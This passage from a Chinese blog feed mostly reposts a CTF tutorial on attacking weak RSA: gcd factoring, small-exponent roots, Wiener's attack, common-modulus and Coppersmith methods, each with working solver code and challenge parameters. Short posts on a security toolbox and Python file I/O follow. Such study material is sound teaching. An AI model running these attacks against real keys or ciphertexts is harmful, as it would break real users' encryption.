也一般取 65537。可以直接 <code>gcd(n1,n2)</code>  求出一个因数。如下:</p>\n<pre><code>n1=9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327\nn2=13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743\n</code></pre>\n<p>可以直接用公约数分解 n，求得 p,q</p>\n<pre><code>def gcd(a, b):\n   if a &lt; b:\n     a, b = b, a\n   while b != 0:\n     temp = a % b\n     a = b\n     b = temp\n   return a\n\nn1=9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327\nn2=13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743\nprint &quot;p: &quot;+str(gcd(n1,n2))\nprint &quot;q1: &quot;+str(n1/gcd(n1,n2))\nprint &quot;q2: &quot;+str(n2/gcd(n1,n2))\n</code></pre>\n<h2 id=\"低加密指数攻击\"><a class=\"markdownIt-Anchor\" href=\"#低加密指数攻击\">#</a> 低加密指数攻击</h2>\n<h1 id=\"e3时的小明文攻击\"><a class=\"markdownIt-Anchor\" href=\"#e3时的小明文攻击\">#</a> e=3 时的小明文攻击</h1>\n<p>当 e=3 时，如果明文过小，导致明文的三次方仍然小于 n，那么通过直接对密文三次开方，即可得到明文。如果明文的三次方虽然比 n 大，但是大不了多少，则可以爆破。如下代码:</p>\n<pre><code>i=0\n   while 1:\n   if(gmpy2.root(c+i*N, 3)[1]==1):\n     print gmpy2.root(c+i*N, 3)\n     break\n   i=i+1\n</code></pre>\n<h1 id=\"低加密指数广播攻击\"><a class=\"markdownIt-Anchor\" href=\"#低加密指数广播攻击\">#</a> 低加密指数广播攻击</h1>\n<p>如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。<br>\n这个识别起来比较简单，一般来说都是给了三组加密的参数和明密文，其中题目很明确地能告诉你这三组的明文都是一样的，并且 e 都取了一个较小的数字。<br>\n<img data-src=\"https://i.imgur.com/H7Zec1s.png\" alt=\"img\"></p>\n<h2 id=\"低解密指数攻击\"><a class=\"markdownIt-Anchor\" href=\"#低解密指数攻击\">#</a> 低解密指数攻击</h2>\n<p>识别：e 看起来特别大就行了<br>\n github 上有开源的攻击代码<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BhYmxvY2VsYXllcy9yc2Etd2llbmVyLWF0dGFjaw==\"> https://github.com/pablocelayes/rsa-wiener-attack</span><br>\n 这里注意一个细节问题，如果在运行脚本的时候报错，请在脚本前加上：</p>\n<pre><code>import   sys\nsys.setrecursionlimit(10000000)\n</code></pre>\n<p>题目：</p>\n<pre><code>Bob is extremely paranoid, so he decided that just one RSA encryption is not enough. Before sending his message to Alice, he forced her to create 5 public keys so he could encrypt his message 5 times! Show him that he still is not secure.\n\n\nHere are the 5 public keys that Bob used, each in the format of (N, e):\n(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 11)\n(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 41)\n(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 67623079903)\n(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 5161910578063)\n(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 175238643578591220695210061216092361657427152135258210375005373467710731238260448371371798471959129039441888531548193154205671)\n\nHere is his encrypted message:\n7117565509436551004326380884878672285722722211683863300406979545670706419248965442464045826652880670654603049188012705474321735863639519103720255725251120\n</code></pre>\n<p>根据题意，用一样的 n 不同的 e 来加密 5 次，其实效果和用 5 个 e 的乘积加密一次是一样的。其实如果 5 个 e 的乘积来加密的话，e 很大的话就可以用低解密指数攻击来了。</p>\n<pre><code>import ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator\n\n\ndef hack_RSA(e,n):\n    '''\n    Finds d knowing (e,n)\n    applying the Wiener continued fraction attack\n    '''\n    frac = ContinuedFractions.rational_to_contfrac(e, n)\n    convergents = ContinuedFractions.convergents_from_contfrac(frac)\n    \n    for (k,d) in convergents:\n        \n        #check if d is actually the key\n        if k!=0 and (e*d-1)%k == 0:\n            phi = (e*d-1)//k\n            s = n - phi + 1\n            # check if the equation x^2 - s*x + n = 0\n            # has integer roots\n            discr = s*s - 4*n\n            if(discr&gt;=0):\n                t = Arithmetic.is_perfect_square(discr)\n                if t!=-1 and (s+t)%2==0:\n                    print(&quot;Hacked!&quot;)\n                    return d\n\n\n(n1,e1)=(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 11)\n(n2,e2)=(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 41)\n(n3,e3)=(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 67623079903)\n(n4,e4)=(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 5161910578063)\n(n5,e5)=(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 175238643578591220695210061216092361657427152135258210375005373467710731238260448371371798471959129039441888531548193154205671)\n\nc=7117565509436551004326380884878672285722722211683863300406979545670706419248965442464045826652880670654603049188012705474321735863639519103720255725251120\ne=e1*e2*e3*e4*e5%n1\nd=hack_RSA(e,n1)\n\n\nm=pow(c,d,n1)\nprint '&#123;:x&#125;'.format(m).decode('hex')\n</code></pre>\n<p>运行的时候如果报 import 包不存在，那是因为没有把<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BhYmxvY2VsYXllcy9yc2Etd2llbmVyLWF0dGFjayVFOSU4NyU4QyVFOSU5RCVBMiVFNiU4OSU4MCVFNiU5QyU4OSVFNyU5QSU4NHB5JUU2JTk2JTg3JUU0JUJCJUI2JUU2JTk0JUJFJUU1JTlDJUE4JUU1JTkwJThDJUU0JUI4JTgwJUU3JTlCJUFFJUU1JUJEJTk1JUU0JUI4JThCJUUzJTgwJTgy\"> https://github.com/pablocelayes/rsa-wiener-attack 里面所有的 py 文件放在同一目录下。</span></p>\n<h2 id=\"共模攻击\"><a class=\"markdownIt-Anchor\" href=\"#共模攻击\">#</a> 共模攻击</h2>\n<p>识别：若干次加密，e 不同，n 相同，m 相同。就可以在不分解 n 和求 d 的前提下，解出明文 m。<img data-src=\"https://i.imgur.com/w8UoOQ2.png\" alt=\"img\"><br>\n 已知 e1,e2,n,c1,c2</p>\n<pre><code>def egcd(a, b):\n    if a == 0:\n      return (b, 0, 1)\n    else:\n      g, y, x = egcd(b % a, a)\n      return (g, x - (b // a) * y, y)\ndef modinv(a, m):\n    g, x, y = egcd(a, m)\n    if g != 1:\n      raise Exception('modular inverse does not exist')\n    else:\n      return x % m\n\ns = egcd(e1, e2)\ns1 = s[1]\ns2 = s[2]\n\nif s1&lt;0:\n   s1 = - s1\n   c1 = modinv(c1, n)\nelif s2&lt;0:\n   s2 = - s2\n   c2 = modinv(c2, n)\nm=(pow(c1,s1,n)*pow(c2,s2,n)) % n\nprint '&#123;:x&#125;'.format(m).decode('hex')\n</code></pre>\n<h2 id=\"已知dpdq求解\"><a class=\"markdownIt-Anchor\" href=\"#已知dpdq求解\">#</a> 已知 dp,dq 求解</h2>\n<p>其实这种方法很简单，但是由于我当时做的时候查了好久 dp,dq 是什么，所以还是记录下来扫个坑吧。<br>\n这种参数是为了让解密的时候更快速产生的，其中:</p>\n<pre><code>dp=d%(p-1)\ndq=d%(q-1)\n</code></pre>\n<p>解密全部代码如下:</p>\n<pre><code>InvQ=gmpy2.invert(q,p)\nmp=pow(c,dp,p)\nmq=pow(c,dq,q)\nm=(((mp-mq)*InvQ)%p)*q+mq\nprint '&#123;:x&#125;'.format(m).decode('hex')\n</code></pre>\n<h2 id=\"隐藏小私有指数δ的rsa后门密钥生成算法\"><a class=\"markdownIt-Anchor\" href=\"#隐藏小私有指数δ的rsa后门密钥生成算法\">#</a> 隐藏小私有指数 δ 的 RSA 后门密钥生成算法</h2>\n<p>以下题目来自于 hctf2016<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzB4NDgucHcvMjAxNi8xMS8yOC8weDI4Lw==\">http://0x48.pw/2016/11/28/0x28/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0hjYW1hZWwvY3RmLWxpYnJhcnkvdHJlZS9tYXN0ZXIvUlNBMQ==\">https://github.com/Hcamael/ctf-library/tree/master/RSA1</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0hjYW1hZWwvY3RmLWxpYnJhcnkvYmxvYi9tYXN0ZXIvUlNBMS9yc2ExX3BheWxvYWQucHk=\">https://github.com/Hcamael/ctf-library/blob/master/RSA1/rsa1_payload.py</span><br>\n 算法原理如下：<br>\n<img data-src=\"https://i.imgur.com/5thK6MI.png\" alt=\"img\"><br>\n 攻击方法也很简单<br>\n<img data-src=\"https://i.imgur.com/5UCVMXO.png\" alt=\"img\"></p>\n<p>解题关键是在下图<br>\n<img data-src=\"https://i.imgur.com/Om8Q7iX.png\" alt=\"img\"><br>\n<img data-src=\"https://i.imgur.com/faCg1Q1.png\" alt=\"img\"><br>\n 根据<strong> rsa-wiener-attack</strong> 我们可以知道，在 rsa 算法中，如果密钥 d 特别小，则我们可以根据 e,n 直接求出 d，所以上图满足条件。</p>\n<p>而当我们求出了那两个东西 (原谅我打不出来…), 则和<strong>已知 e,d,n 求 p,q</strong> 的情况一样了，当 p,q 已知的时候就可以解出 d 了</p>\n<h2 id=\"基于隐藏素数因子的rsa-hpβ算法高比特位已知分解\"><a class=\"markdownIt-Anchor\" href=\"#基于隐藏素数因子的rsa-hpβ算法高比特位已知分解\">#</a> 基于隐藏素数因子的 RSA-HPβ 算法 (高比特位已知分解)</h2>\n<p>以下题目来自于 hctf2016<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0hjYW1hZWwvY3RmLWxpYnJhcnkvdHJlZS9tYXN0ZXIvUlNBMg==\">https://github.com/Hcamael/ctf-library/tree/master/RSA2</span><br>\npayload:</p>\n<pre><code>https://github.com/Hcamael/ctf-library/blob/master/RSA2/rsa2_payload.py\nhttps://github.com/Hcamael/ctf-library/blob/master/RSA2/rsa2_payload.sage\n</code></pre>\n<p>该后门算法依赖于<strong> Coppersmith partial information attack</strong> 算法，sage 实现该算法，sage 安装详细看我的另一篇关于 sage 的安装。</p>\n<p>Coppersmith partial information attack 算法可以理解成，当我们已知素数 p 或者 q 的前一定位数，可以根据这个算法还原完整的 p，q。<br>\n算法实现代码：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0dhby1DaHVhbi9SU0EtYW5kLUxMTC1hdHRhY2tz\">https://github.com/Gao-Chuan/RSA-and-LLL-attacks</span></p>\n<p>例题如下：<br>\n<img data-src=\"https://i.imgur.com/P7UXiV6.png\" alt=\"img\"></p>\n<p>仔细观察算法，n 是靠 t,u,r 来拼接成，而 u 是根据 p 的前 5k/16 位进行 des 转置得到的，所以<strong>当我们已知 n 的前提下，相当于我们已知 p 的前 5k/16 位</strong>。这就是我们利用的点。如下图：<br>\n<img data-src=\"https://i.imgur.com/jtz02KN.png\" alt=\"img\"></p>\n<p>利用代码如下:</p>\n<pre><code>p4 = 0xf3a5f928e11c5901f9f4289e513f046748efb99d4f8e706e207a943e1d2c9df43feab38e20c2106d87167e5501ac41adfc4912732457103a4359e5b433da78f39ad6f206b8f170192aa0841feb501ce1\nn = 0x7e7007c7c85788b9b77cda64c9b3f5d2a795fe1b1f8d3f120288a30a168c3ea932c7574700ff0f596c5ad04a703756aedc66b9b9e44911d55f0a72a1cc1a569cee02a84499cdb091b8471a8e6cc0ebca583dfd6fb8d5fecf32ff67d2ddeaaaaf9c71a10009b4218fc57743675f283d22734ac7ade2ca240772d11b5783755378f7c30988f41d4a9d62561ea6e5f2f21d3d44e8689e781d3f61356123929457d17b07a1d04741bf970afb590cd820dd12cf88f68b0e896388f433fd2adf3354353c9c56abb0cfea223387e6d0b2df10e450c621ac153e47369f888fdc0b39c842a5ddc6a11339862ccdb4be97a81445205fb8f8bde9daaad5d0dc2ea5bd3b8c43\n\n//p的位数\npbits = 1024\n//p未知的位数\nkbits = pbits - p4.nbits()\nprint p4.nbits()\np4 = p4 &lt;&lt; kbits\n\nPR.&lt;x&gt; = PolynomialRing(Zmod(n))\n\n//f是原始的p\nf = x + p4\nx0 = f.small_roots(X=2^kbits, beta=0.4)[0]\nprint &quot;x: %s&quot; %hex(int(x0))\n\np = p4+x0\nprint &quot;p: &quot;, hex(int(p))\nassert n % p == 0\nq = n/int(p)\n\nprint &quot;q: &quot;, hex(int(q))\n</code></pre>\n<p><img data-src=\"https://i.imgur.com/Vwccm9g.png\" alt=\"img\"></p>\n<h2 id=\"第二届强网杯_nextrsa_coppersmith\"><a class=\"markdownIt-Anchor\" href=\"#第二届强网杯_nextrsa_coppersmith\">#</a> 第二届强网杯_nextrsa_Coppersmith</h2>\n<p>题目描述是，加密指数 e=3，同时已知明文的高位，参数如下：</p>\n<pre><code># n=0x79982a272b9f50b2c2bc8b862ccc617bb39720a6dc1a22dc909bbfd1243cc0a03dd406ec0b1a78fa75ce5234e8c57e0aab492050906364353b06ccd45f90b7818b04be4734eeb8e859ef92a306be105d32108a3165f96664ac1e00bba770f04627da05c3d7513f5882b2807746090cebbf74cd50c0128559a2cc9fa7d88f7b2d\n# e=0x3\n# c=0x381db081852c92d268b49a1b9486d724e4ecf49fc97dc5f20d1fad902b5cdfb49c8cc1e968e36f65ae9af7e8186f15ccdca798786669a3d2c9fe8767a7ae938a4f9115ae8fed4928d95ad550fddd3a9c1497785c9e2279edf43f04601980aa28b3b52afb55e2b34e5b175af25d5b3bd71db88b3b31e48a177a469116d957592c\n# b=0xfedcba98765432100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n# m=b+x (x:64bit)\n</code></pre>\n<p>其中不知道的就是 64 比特的 x，不过根据以下代码就可以算出 x：</p>\n<pre><code>e = 0x3\nb = b=0xfedcba98765432100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\nn = 0x79982a272b9f50b2c2bc8b862ccc617bb39720a6dc1a22dc909bbfd1243cc0a03dd406ec0b1a78fa75ce5234e8c57e0aab492050906364353b06ccd45f90b7818b04be4734eeb8e859ef92a306be105d32108a3165f96664ac1e00bba770f04627da05c3d7513f5882b2807746090cebbf74cd50c0128559a2cc9fa7d88f7b2d\nc=0x381db081852c92d268b49a1b9486d724e4ecf49fc97dc5f20d1fad902b5cdfb49c8cc1e968e36f65ae9af7e8186f15ccdca798786669a3d2c9fe8767a7ae938a4f9115ae8fed4928d95ad550fddd3a9c1497785c9e2279edf43f04601980aa28b3b52afb55e2b34e5b175af25d5b3bd71db88b3b31e48a177a469116d957592c\n\nkbits=64\nPR.&lt;x&gt; = PolynomialRing(Zmod(n))\nf = (x + b)^e-c\nx0 = f.small_roots(X=2^kbits, beta=1)[0]\nprint &quot;x: %s&quot; %hex(int(x0))\n</code></pre>\n<h2 id=\"强网杯_nextrsa_nextprime\"><a class=\"markdownIt-Anchor\" href=\"#强网杯_nextrsa_nextprime\">#</a> 强网杯_nextrsa_nextprime</h2>\n<p>参数如下：</p>\n<pre><code># n=0x78e2e04bdc50ea0b297fe9228f825543f2ee0ed4c0ad94b6198b672c3b005408fd8330c36f55d36fb129d308c23e5cb8f4d61aa7b058c23607cef83d63c4ed0f066fc0b3c0062a2ac68c75ca8035b3bd7a320bdf29cfcf6cc30377743d2a8cc29f7c588b8043412366ab69ec824309cb1ef3851d4fb14a1f0a58e4a1193f5518fa1d0c159621e1f832b474182593db2352ef05101bf367865ad26efe14fce977e9e48d3310a18b67991958d1a01bd0f3276a669866f4deaef2a68bfaefd35fe2ba5023a22c32ae8b2979c26923ee3f855363f18d8d58bb1bc3b7f585c9d9f6618c727f0f7b9e6f32af2864a77402803011874ed2c65545ced72b183f5c55d4d1\n# e=0x10001\n# nextprime(p)*nextprime(q)=0x78e2e04bdc50ea0b297fe9228f825543f2ee0ed4c0ad94b6198b672c3b005408fd8330c36f55d36fb129d308c23e5cb8f4d61aa7b058c23607cef83d63c4ed0f066fc0b3c0062a2ac68c75ca8035b3bd7a320bdf29cfcf6cc30377743d2a8cc29f7c588b8043412366ab69ec824309cb1ef3851d4fb14a1f0a58e4a1193f5a58ee70a59ac06b64dbe04b876ff69436b78cf03371f2062707897bf4e580870e42b5e62709b69f6d4939ac5641ea0f29de44aaee8f2fcd0f66aaa720b584f7c801e52ce7cd41db45ceb99ebd7b51bef8d0cd2deb5c50b59f168276c9c98d46a1c37bd3d6ef81f2c6e89028680a172e00d92dd8b392135112dd16efab57d00b26b9\n# c=0x1c3588ac81ec3d1b439cfd2d5e6e8a5a95c8f95aaeff1b0ba49276ade80435323f307a17006ae2ffb4ca321e54387d9b33ed7ccda3117f7bc8d247ffd2ccdd67b7e2aad3d908d0a5187a73d13d532c1cf41758e2743bd4359bf72a99bbf0d716bb171cf636bd56acee9551cbb8af25f32583facbd25aed232659d24580c5a30a080e2860790a65422f7c442559c3042d37fdd7e8c1dd604252a2cbff8c74e5a0b6a0dfb9dcfed9eed515705ab9214dcf2dabce7b354040940613d065918079b3197da948b6d1d7daccc417069f7102fd2525e879fe69b6d5fb39e1dd6c0a9a9087dcc809294d7774efb42829f6124dff4af44f308977d1f91422c63073176026\n</code></pre>\n<p>方法一：</p>\n<pre><code>#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n__Auther__ = 'M4x'\n\n\nfrom gmpy2 import is_prime as prime\nfrom gmpy2 import iroot\n\nn = 15260473398916071686287752340249158279343013077145667794514717692352941873466690686288442204714585854869226872705293008837554012949598044297596015507031315006195230644722581744643756573982729344499452200116366327869178694692162014446578711956663348262932703160394101606708475725742890049311933691849747707673216322758418530420118502556719323543077771821163439824876751874675862075401986796272014746925015772045578403357300038192830197985871077621213669817380577176611560467051848951044963527185916781094981810804641387975398361694935093473717039550361644252381923994841138817152748279477868854093033234031994635408593\nnn = 15260473398916071686287752340249158279343013077145667794514717692352941873466690686288442204714585854869226872705293008837554012949598044297596015507031315006195230644722581744643756573982729344499452200116366327869178694692162014446578711956663348262932703160394101606708475725742890049311933691849747707914818082716474881224336472709074679047145667796106895298086129057288449508218237679974321952279429832707229303594474494519945899481320231091983665654947081839784375373657345023890332691371443571370016623789041883821610353473726465037590414008198228956920913181526550775524028059426312173493877228564452496582329\n\n#  print nn &gt; n\nt = nn - n\nf1 = lambda x, y: pow(x * y - t, 2) - 4 * n * x * y\nf2 = lambda x, y, s: (t - x * y - s) / (2 * x)\n\nfor x in xrange(1, 3000):\n    for y in xrange(1, 3000):\n        print x, y\n        if f1(x, y) &gt;= 0:\n            s, b = iroot(f1(x, y), 2)\n            if b:\n                if prime(f2(x, y, int(s))):\n                    print &quot;Success&quot;\n                    print f2(x, y, int(s))\n                    exit()\n</code></pre>\n<p>就是</p>\n<pre><code>pq = n\n(p + x)(q + y) = n'\n-&gt; xy + py + qx = t(t = n' - n)\n\n-&gt; xq^2^ + (xy - t)q + ny = 0\n\n则该方程有素数接即可，可爆破x，y\n</code></pre>\n<p>方法二：<br>\n因为 <code>n = p * q,nn = p1 * q1</code> <br>\n 因为 n 和 nn 很相近，所以 n*nn 讲道理用 yafu 很快就能跑出来<br>\n可以得到 <code>t1 = p*q1,t2 = q*p1 </code> <br>\n然后 gcd 一下就可以了</p>\n<p>[赏](javascript:void (0))</p>\n<p><strong>本文标题:</strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lcnIwcnp6LmdpdGh1Yi5pby8yMDE3LzExLzE0L0NURiVFNCVCOCVBRFJTQSVFNSVBNSU5NyVFOCVCNyVBRi8=\">CTF 中 RSA 套路</span></p>\n<p><strong>文章作者:</strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lcnIwcnp6LmdpdGh1Yi5pby8=\">Err0rzz</span></p>\n<p>** 发布时间:**2017 年 11 月 14 日 - 19 时 16 分</p>\n<p>** 最后更新:**2018 年 05 月 23 日 - 10 时 15 分</p>\n<p><strong>原始链接:</strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lcnIwcnp6LmdpdGh1Yi5pby8yMDE3LzExLzE0L0NURiVFNCVCOCVBRFJTQSVFNSVBNSU5NyVFOCVCNyVBRi8=\">http://Err0rzz.github.io/2017/11/14/CTF 中 RSA 套路 /</span></p>\n<p><strong>许可协议:</strong> <span class=\"exturl\" data-url=\"aHR0cDovL2NyZWF0aXZlY29tbW9ucy5vcmcvbGljZW5zZXMvYnktbmMtc2EvMy4wL2NuLw==\">“署名 - 非商用 - 相同方式共享 3.0”</span> 转载请保留原文链接及作者。</p>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/12/toolbox/",
            "url": "http://waltcsz.github.io/2023/12/toolbox/",
            "title": "toolBox",
            "date_published": "2023-12-04T07:39:52.000Z",
            "content_html": "<ul>\n<li>fidder:\t抓包 可抓其他设备</li>\n<li>burpsuite: 抓包，jar 启动</li>\n<li>proxifier：代理</li>\n<li>clash：代理</li>\n<li></li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/12/python/",
            "url": "http://waltcsz.github.io/2023/12/python/",
            "title": "python",
            "date_published": "2023-12-03T11:57:24.000Z",
            "content_html": "<h1 id=\"文件操作\"><a class=\"markdownIt-Anchor\" href=\"#文件操作\">#</a> 文件操作</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'filename.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'w'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>'wb’表示读二进制文件</p>\n<h2 id=\"二进制文件\"><a class=\"markdownIt-Anchor\" href=\"#二进制文件\">#</a> 二进制文件</h2>\n<p>一般不能用文本编辑器查看。可以原样储存 python 中的变量，并且可以原样还原。</p>\n<h3 id=\"struct模块\"><a class=\"markdownIt-Anchor\" href=\"#struct模块\">#</a> struct 模块</h3>\n<p>以指定格式将变量转换为字节串。</p>\n<table>\n<thead>\n<tr>\n<th>方法名</th>\n<th>返回值</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>pack(fmt,v1,v2…)</td>\n<td>bytes</td>\n<td>按照给定的格式（fmt），把数据 v1,v2… 转换成字节串，并将该字节串返回。</td>\n</tr>\n<tr>\n<td>unpack(fmt,bytes)</td>\n<td>Tuple</td>\n<td>按照给定的格式（fmt），解析字节流 bytes, 并返回解析结果。</td>\n</tr>\n<tr>\n<td>calcsize(fmt)</td>\n<td>size of fmt</td>\n<td>计算给定的格式（fmt）占用多少字节的内存，注意对齐方式。</td>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<td>格式符</td>\n<td>对应的 C 语言  数据类型</td>\n<td>对应的 Python 数据类型</td>\n<td>数据字节数</td>\n</tr>\n<tr>\n<td>----------</td>\n<td>-------------------------------------</td>\n<td>--------------------------------</td>\n<td>------------------------------------------------------------</td>\n</tr>\n<tr>\n<td>s</td>\n<td>字符串</td>\n<td>bytes</td>\n<td>由 s 前的数字决定，例如，4s 表示打包为 4 个字节</td>\n</tr>\n<tr>\n<td>i</td>\n<td>整型</td>\n<td>整型</td>\n<td>4</td>\n</tr>\n<tr>\n<td>h</td>\n<td>短整型</td>\n<td>整型</td>\n<td>2</td>\n</tr>\n<tr>\n<td>f</td>\n<td>单精度浮点型</td>\n<td>浮点型</td>\n<td>4</td>\n</tr>\n<tr>\n<td>d</td>\n<td>双精度浮点型</td>\n<td>浮点型</td>\n<td>8</td>\n</tr>\n<tr>\n<td>c</td>\n<td>字符型</td>\n<td>长度为 1 的 bytes</td>\n<td>1</td>\n</tr>\n<tr>\n<td>?</td>\n<td>布尔型</td>\n<td>布尔型</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n<pre><code>样例\n以后再写\n</code></pre>\n<h3 id=\"pickle模块\"><a class=\"markdownIt-Anchor\" href=\"#pickle模块\">#</a> pickle 模块</h3>\n<p>直接将变量按调用顺序从文件中读写。</p>\n<ul>\n<li><code>dump()</code>  写入文件。</li>\n<li><code>load()</code>  读入程序。</li>\n</ul>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pickle<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">,</span>protocol<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\">#obj 可为任意类型数据</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a<span class=\"token operator\">=</span>pickle<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"csv文件\"><a class=\"markdownIt-Anchor\" href=\"#csv文件\">#</a> csv 文件</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>objcsv <span class=\"token operator\">=</span> csv<span class=\"token punctuation\">.</span>writer<span class=\"token punctuation\">(</span>csvfile<span class=\"token punctuation\">,</span> dialect<span class=\"token operator\">=</span><span class=\"token string\">'execl'</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">**</span>fmtparams<span class=\"token punctuation\">)</span>\t<span class=\"token comment\">#创建 csv.write 对象</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>objcsv<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>row<span class=\"token punctuation\">)</span>\t<span class=\"token comment\"># 写入一行，一维数组</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>objcsv<span class=\"token punctuation\">.</span>writeows<span class=\"token punctuation\">(</span>rows<span class=\"token punctuation\">)</span>\t<span class=\"token comment\"># 写入多行，二维数组</span></pre></td></tr></table></figure><p>csv.DictWriter</p>\n<p>比上面多了个 headline</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>csv<span class=\"token punctuation\">.</span>DictWriter<span class=\"token punctuation\">(</span>csvfile<span class=\"token punctuation\">,</span>fieldnames<span class=\"token punctuation\">,</span>restval<span class=\"token operator\">=</span>’’<span class=\"token punctuation\">,</span>extrasaction<span class=\"token operator\">=</span>’<span class=\"token keyword\">raise</span>’<span class=\"token punctuation\">,</span>dialect<span class=\"token operator\">=</span>’excel’<span class=\"token punctuation\">,</span><span class=\"token operator\">*</span>args<span class=\"token punctuation\">,</span><span class=\"token operator\">**</span>kwds<span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/11/disjointset/",
            "url": "http://waltcsz.github.io/2023/11/disjointset/",
            "title": "disjointSet",
            "date_published": "2023-11-24T13:17:13.000Z",
